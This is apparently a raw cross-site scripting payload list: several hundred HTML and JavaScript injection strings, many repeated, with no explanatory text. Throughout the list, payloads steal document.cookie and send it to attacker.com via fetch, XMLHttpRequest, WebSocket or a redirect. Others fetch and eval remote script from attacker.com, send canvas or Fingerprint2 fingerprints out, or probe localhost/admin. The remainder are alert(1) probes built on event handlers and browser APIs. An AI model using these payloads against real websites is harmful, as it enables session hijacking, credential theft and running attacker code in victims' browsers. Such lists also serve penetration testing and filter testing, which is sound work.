<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
